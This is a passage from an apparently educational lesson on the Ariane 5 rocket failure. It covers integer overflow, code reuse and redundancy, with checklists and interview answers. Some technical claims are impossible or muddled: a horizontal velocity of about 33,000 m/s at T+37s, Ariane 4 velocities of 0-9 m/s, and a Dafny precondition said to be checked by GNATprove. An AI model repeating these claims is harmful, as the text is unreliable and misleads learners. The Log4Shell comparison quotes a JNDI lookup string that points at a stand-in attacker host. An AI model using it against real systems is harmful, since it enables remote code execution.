   = same bugs = same simultaneous failure = no protection.

**Interview one-liner:**
"Ariane 5 (1996): float64 -> int16 overflow in navigation computer (SRI). Velocity exceeded INT16_MAX. Unhandled Ada exception -> SRI outputs diagnostic data on flight bus -> flight computer interprets as valid attitude data -> commands max correction -> rocket destroyed. $370M.
Three lessons: (1) Integer overflow in safety-critical code must be explicitly checked or prevented by type choice. (2) Code reuse requires re-verifying all operand range assumptions in the new operational context. (3) Identical software in redundant systems provides ZERO protection against software bugs (common-cause failure). Diverse software required for independent redundancy.
Fix: disable the BH computation after alignment (wasn't needed in flight anyway). Never ran."

---

### 💎 Transferable Wisdom

**Reusable Engineering Principle:**
EVERY PIECE OF CODE HAS IMPLICIT ASSUMPTIONS. MAKE THEM EXPLICIT. VERIFY THEM IN EVERY CONTEXT.
The Ariane 4 SRI's implicit assumption: "horizontal velocity will never exceed 32,767."
No comment in the code said this. No requirement document stated it. It was implicit in
the type choice: `int16`. The assumption was valid for Ariane 4. Never questioned for Ariane 5.
This pattern repeats constantly in software: code that "works" has invisible assumptions baked in.
The failures happen when a new context violates an assumption that nobody documented.

How to make assumptions explicit:
1. Use types that enforce assumptions: `Velocity` (newtype with validated range) not `short`.
2. Add range checks at module boundaries with clear error messages.
3. Document operand ranges in function/method contracts (Javadoc @param, Dafny requires).
4. Use property-based tests that probe the full range.
5. When reusing code: conduct an explicit assumption audit. List all assumptions. Verify each.

This principle extends beyond software: bridge designs assume max load (must re-verify for
heavier trucks). Drug dosages assume patient weight ranges (must re-verify for pediatric use).
Financial models assume interest rate ranges (must re-verify for negative interest environments).
Assumptions about context are everywhere. Making them explicit and verifying them in each new
context: the universal engineering discipline.

**Where else this pattern appears:**

- **Y2K (Year 2000 problem): same class of range assumption failure** - Y2K is the closest analog
  to Ariane 5 at a global scale. In the 1960s-1980s, storage was expensive. Dates were stored with
  2-digit years: "75" = 1975. IMPLICIT ASSUMPTION: this software will not run past 1999. The
  assumption was baked into the representation (2 digits = 0-99 = 1900-1999), not documented,
  and not questioned for decades. As 2000 approached: "00" would be interpreted as 1900. Systems
  would calculate "2000 - 1900 = 100 years" of interest in a single step, or calculate that events
  in 2000 happened 99 years before events in 1999. The same Ariane 5 mechanism: a representation
  (2-digit year = int16 for velocity) with an implicit range assumption (year < 2000 = velocity < 32,767)
  that eventually violated. Y2K cost: estimated $300-600 billion in remediation globally. The lesson:
  implicit representation assumptions in long-lived code are ticking time bombs. They work until they
  don't. Explicit assumptions (comment: "this code is valid until 2079 when 2-digit years overflow again"),
  type enforcement (full 4-digit year type), and assumption audits on reuse: would have caught both
  Y2K and Ariane 5.
- **Apache log4j JNDI (Log4Shell, 2021): reuse assumption failure in security** - Log4Shell was not
  an overflow bug but was the same pattern: a REUSED FEATURE with an implicit assumption violated in
  a new context. Log4j's JNDI lookup feature: designed for server-side logging configuration lookup
  (legitimate use: load configuration from a directory server). Implicit assumption: the strings
  being logged are INTERNAL system strings (not user-controlled input). Log messages are internal.
  In 2021: many applications logged user-supplied input (HTTP headers, request parameters). JNDI
  lookups in user-controlled strings: attackers insert `${jndi:ldap://attacker.com/x}` into a
  log message. Log4j looks it up (the JNDI feature runs, as designed, with the implicit assumption
  that the string is trusted). Attacker's LDAP server: returns a malicious class. RCE in the
  logging framework. The reuse assumption failure: JNDI lookup was designed for trusted strings.
  It was reused in contexts where strings were untrusted. The assumption "strings are internal and
  trusted" was never stated, never checked when the feature was applied to user-input logging.
  Same root cause as Ariane 5: implicit assumption, new context, violated assumption, catastrophic result.

---

### 💡 The Surprising Truth

The Ariane 5 inquiry board identified that the BH (horizontal bias) computation was not even
NEEDED during the first 40 seconds of flight. The SRI's alignment function (which uses BH)
was only needed during the GROUND ALIGNMENT phase before launch. Once the rocket lifted off:
the alignment was complete, and the BH computation served no purpose. It was running during
flight purely because nobody turned it off. The simple, correct fix: disable the BH computation
after alignment is complete. One `if (not_alignment_phase) return;`. The computation that
destroyed a $370M rocket was a DEAD CODE PATH: code that ran but did nothing useful.
Dead code in safety-critical systems is dangerous: it can still fail, still consume resources,
still produce harmful side effects - even though it contributes nothing. The Ariane 5 lesson
for everyday software: regularly audit your code for computations that are running but no longer
needed. Every unnecessary computation is a future bug waiting to be triggered by an input range
that nobody expected. The simplest code is the correct code: if a computation doesn't need
to run, don't run it. Remove it or disable it. "No code is the best code." The Ariane 5's
unnecessary BH computation in flight: cost $370 million.

---

### ✅ Mastery Checklist

**You've mastered this when you can:**

1. **[OVERFLOW CHAIN]** Trace the complete causal chain from the integer overflow in the SRI
   to the rocket's destruction. Identify 3 places in the chain where a different design decision
   would have broken the causal chain and saved the mission.

2. **[OVERFLOW-SAFE CODE]** Write a Java utility method `safeDoubleToShort(double value)` that
   converts safely and fails clearly on out-of-range values. Also write a version that SATURATES
   (clamps to MAX/MIN) instead of throwing. When would each be appropriate in a safety-critical context?

3. **[REUSE AUDIT]** You are reusing a Java utility class `MoneyFormatter.formatCents(long cents)`
   (originally written for a system where amounts were always < 1,000,000 cents) in a new system
   where amounts can be up to 10 trillion cents. What analysis do you perform? What changes do you make?

4. **[REDUNDANCY]** Your team proposes a "hot standby" for a payment processing service: identical
   code, automatic failover. What is the risk? What should you change to make the redundancy meaningful?

5. **[STANDARDS]** DO-178C Level A requires "diverse software for independent monitoring channels."
   Explain what this means in the context of the Ariane 5 incident. What would "diverse software"
   look like for the Ariane 5 backup SRI?

---

### 🧠 Think About This Before We Continue

**Q1.** The Ariane 5 SRI team had formal verification evidence from Ariane 4 testing.
Why didn't formal verification prevent the failure? What type of formal verification
WOULD have caught it?

*Hint: The Ariane 4 SRI verification was CORRECT but SCOPED to Ariane 4's operational envelope.
The verification statement was (implicitly): "this software is correct for inputs within Ariane 4's
expected ranges." This is PARTIAL CORRECTNESS: correct for the tested/verified inputs.

WHAT WAS VERIFIED:
For all horizontal velocities in Ariane 4's operational envelope (say, 0-9 m/s at T+37s):
the SRI computes the correct BH value. This was verified exhaustively for Ariane 4.
WHAT WAS NOT VERIFIED:
For horizontal velocities > 32,767 m/s: behavior is undefined (overflow).
The verification ASSUMED the input would never be > 32,767 m/s.
The assumption was valid for Ariane 4. Not verified for Ariane 5.

WHAT WOULD HAVE CAUGHT IT:

1. OPERAND RANGE ANALYSIS (static): before running Ariane 4 SRI on Ariane 5:
   "What is the maximum horizontal velocity of Ariane 5 at T+37s?"
   Answer: ~33,000 m/s (much higher than Ariane 4).
   "Does this exceed INT16_MAX?"
   Answer: YES.
   Conclusion: CANNOT reuse this code without change.
   This is not a "formal verification" per se: it's engineering analysis.
   But it would have caught the issue.

2. DAFNY / SPARK PRE/POST CONDITION VERIFICATION:
   Dafny precondition on the conversion:
   `requires velocity >= -32768.0 && velocity <= 32767.0`
   When the Ariane 5 trajectory data shows velocity = 33,000 at T+37s:
   GNATprove (SPARK) reports: "precondition might not hold."
   The formal tool CATCHES the assumption violation at analysis time.

3. TLA+/MODEL CHECKING for the failure chain:
   A TLA+ model of the full SRI-OBC interaction:
   "If SRI outputs diagnostic data to the flight bus: OBC misinterprets as flight data."
   This safety property: []NOT(SRI_diagnostic_on_flight_bus).
   Model checker: finds the path (overflow -> exception -> SRI halt -> diagnostic on bus)
   and reports: safety property violated.
   Would have caught the SYSTEM-LEVEL failure (not just the SRI-level overflow).

LESSON: The Ariane 5 needed SYSTEM-LEVEL verification (what happens when SRI fails?)
not just component-level verification (is the SRI code correct for its own inputs?).*

---

### 🎯 Interview Deep-Dive

**Q1: "What was the Ariane 5 incident and what lessons does it teach about integer overflow and code reuse?"**

*Why they ask:* Tests awareness of software engineering history and numeric safety. Common for safety-critical roles.

*Strong answer includes:*
- Ariane 5 Flight 501, June 4, 1996. First launch, self-destructed 37 seconds after liftoff. $370M.
- Root cause: float64-to-int16 overflow. Horizontal velocity exceeded INT16_MAX (32,767). Ada Constraint_Error raised, unhandled.
- SRI halted, output diagnostic data to the flight computer bus. OBC misinterpreted as valid attitude data. Commanded extreme correction. Rocket broke apart.
- Backup SRI: identical software = common-cause failure. Both failed simultaneously.
- Reuse failure: Ariane 4 SRI verified for Ariane 4's velocity envelope. Reused for Ariane 5 without re-verifying. Ariane 5's higher velocity violated the int16 range assumption.
- Lessons: (1) Integer overflow must be explicitly handled in safety-critical code. (2) Code reuse requires re-verifying all operand range assumptions in the new context. (3) Identical redundant software provides no protection against software bugs (need diverse software).
- Fix: disable BH computation after alignment (it wasn't needed in flight).

**Q2: "What is common-cause failure and how do you design redundant systems to avoid it?"**

*Why they ask:* Tests knowledge of fault-tolerant system design. Expected for distributed systems or safety-critical roles.

*Strong answer includes:*
- Common-cause failure: multiple redundant components fail for the SAME reason simultaneously.
- Ariane 5: identical software in primary and backup SRI. Both failed simultaneously from the same software bug. Redundancy provided zero protection against the software fault.
- Protection approaches: (1) DIVERSE SOFTWARE: different implementation teams, possibly different languages or algorithms. Different bugs, independent failure modes. (2) DIFFERENT ROLES: backup uses simpler, more conservative algorithm that cannot fail the same way. (3) INDEPENDENT VALIDATION: if same software, re-verify for all scenarios that can affect the backup.
- Modern standard: DO-178C requires diverse software for independent monitoring channels in Level A systems.
- Application to distributed services: if all instances run identical code, a single software bug affects all instances simultaneously. Consider: canary deployments (run new version on small fraction of traffic first), feature flags (enable gradually), testing in production with shadow traffic before full rollout. These are operational analogs of diverse software in aerospace.
